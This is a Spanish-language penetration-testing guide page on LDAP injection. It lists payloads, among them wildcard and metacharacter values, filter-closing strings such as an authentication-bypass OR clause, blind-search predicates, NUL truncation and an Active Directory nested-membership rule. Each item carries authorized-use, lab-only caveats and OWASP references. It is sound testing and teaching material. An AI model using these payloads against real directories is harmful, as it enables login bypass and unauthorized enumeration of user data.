# 🗡️ LDAP injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Valores de búsqueda y metacaracteres

```text
prueba-123
prueba*
*
(
)
```

**Cuándo usarlo:** Una línea por búsqueda en directorio propio. * puede ampliar resultados si el backend construye (uid={valor}); no usarlo para enumerar terceros.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.1/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection/).


### Comparar wildcard con literal escapado

```text
prueba*
prueba\2a
(uid=prueba*)
(uid=prueba\2a)
```

**Cuándo usarlo:** Las dos primeras líneas son valores; las dos últimas filtros completos de laboratorio. RFC 4515 codifica * literal como \2a.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html).


## 🧭 Payloads por contexto

### Filtros completos con AND y OR

```ldap
(&(objectClass=person)(uid=prueba-123))
(|(uid=prueba-123)(uid=prueba-456))
(&(uid=prueba-123)(!(uid=prueba-456)))
```

**Cuándo usarlo:** Un filtro por ejecución en laboratorio. Sirven para entender estructura prefija antes de adaptar fragmentos al punto de inyección.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.1/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection/).


### Caracteres reservados según RFC 4515

```text
\2a  →  *
\28  →  (
\29  →  )
\5c  →  \
\00  →  NUL
```

**Cuándo usarlo:** Tabla de codificación, no payload único. Deben escaparse valores antes de insertarlos en filtros LDAP; DN usa reglas diferentes.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html).


## 🔥 Payloads avanzados

### Predicados controlados para búsqueda ciega

```ldap
(&(uid=prueba-123)(cn=prueba-123))
(&(uid=prueba-123)(cn=prueba-inexistente))
(&(uid=prueba-123)(mail=prueba*@{DOMINIO_LAB}))
```

**Cuándo usarlo:** Filtros completos, uno por prueba, con atributos de cuenta propia. Solo una diferencia reproducible sobre datos propios apoya interpretación del filtro.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.1/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection/).


## 🔬 Pruebas guiadas por escenario

### 1. Comodín frente a asterisco escapado

**Objetivo:** En una búsqueda de una entrada propia, comparar wildcard y literal según RFC 4515.

```text
prueba*
prueba\2a
```

**Interpretación:** El primero puede ser búsqueda legítima. Es inyección si el contrato exigía una cadena literal y el filtro cambia.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 2. Cierre de filtro y OR

**Objetivo:** Solo en un login LDAP de laboratorio que interpola uid antes de userPassword; usar identidades de prueba.

```text
*)(uid=*))(|(uid=*
```

**Interpretación:** El payload depende de paréntesis de la consulta original; comprobar filtro final antes de reportar bypass.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 3. Condición falsa de control

**Objetivo:** Par de comparación para una condición sobre atributo de prueba.

```text
*)(mail=prueba-123@example.test
*)(mail=ausente-123@example.test
```

**Interpretación:** Una diferencia estable apoya que el filtro incorporó la condición; evita enumerar atributos ajenos.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 4. Filtro por objectClass

**Objetivo:** Probar si un cierre permite insertar otro atributo conocido.

```text
*)(objectClass=person
```

**Interpretación:** Comparar con atributo improbable; puede fallar por sintaxis o por esquema, no necesariamente por sanitización.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 5. Operador NOT de filtro LDAP

**Objetivo:** Solo si el campo permite un filtro completo o el cierre queda balanceado.

```text
(!(uid=prueba-ausente))
```

**Interpretación:** Una inversión de resultados en datos propios muestra interpretación de sintaxis; validar contexto exacto.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 6. Atributo mail con wildcard

**Objetivo:** En un buscador de directorio propio, probar expansión controlada.

```text
prueba*)(mail=*@example.test
```

**Interpretación:** El efecto depende de la plantilla LDAP original y de si el servidor permite el atributo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 7. NUL codificado

**Objetivo:** Solo laboratorio legacy donde se sospeche truncamiento entre componentes.

```text
prueba%00resto
```

**Interpretación:** Modernas bibliotecas suelen rechazar NUL; un error no es vulnerabilidad y no debe asumirse bypass.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md).

### 8. Filtro completo con OR entre dos cuentas propias

**Objetivo:** Solo si un campo anunciado como uid literal se acepta como filtro LDAP completo en laboratorio.

```ldap
(|(uid=prueba-a)(uid=prueba-b))
```

**Interpretación:** Recibir ambas entradas revela que el cliente controla la estructura del filtro; una API de filtros intencional no es fallo.

**Fuente técnica:** [www.rfc-editor.org](https://www.rfc-editor.org/rfc/rfc4515).

### 9. Filtro AND con NOT

**Objetivo:** Directorio aislado con dos entradas del tester, una marcada como ausente.

```ldap
(&(objectClass=person)(!(uid=prueba-ausente)))
```

**Interpretación:** Comprobar inversión respecto a una condición igual; esta sintaxis requiere control del filtro completo.

**Fuente técnica:** [www.rfc-editor.org](https://www.rfc-editor.org/rfc/rfc4515).

### 10. Coincidencia aproximada

**Objetivo:** Solo en un atributo de prueba con regla approximateMatch habilitada.

```ldap
(cn~=Prueba Uno)
```

**Interpretación:** Comparar con coincidencia exacta y valor distante; el servidor puede tratar `~=` como igualdad según esquema.

**Fuente técnica:** [www.rfc-editor.org](https://www.rfc-editor.org/rfc/rfc4515).

### 11. Comparación ordenada de atributo numérico

**Objetivo:** En un directorio de laboratorio con uidNumber controlados.

```ldap
(uidNumber>=1000)
```

**Interpretación:** Un rango aceptado donde se esperaba un valor literal muestra control del operador; limitar la respuesta a entradas propias.

**Fuente técnica:** [www.rfc-editor.org](https://www.rfc-editor.org/rfc/rfc4515).

### 12. Matching rule transitiva de Active Directory

**Objetivo:** Solo AD de laboratorio con grupos y usuarios propios, si se acepta un filtro LDAP completo.

```ldap
(memberOf:1.2.840.113556.1.4.1941:=CN=GrupoPrueba,OU=Lab,DC=ejemplo,DC=test)
```

**Interpretación:** La regla puede incluir membresía anidada; una diferencia frente a igualdad simple depende de la estructura real del lab.

**Fuente técnica:** [Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
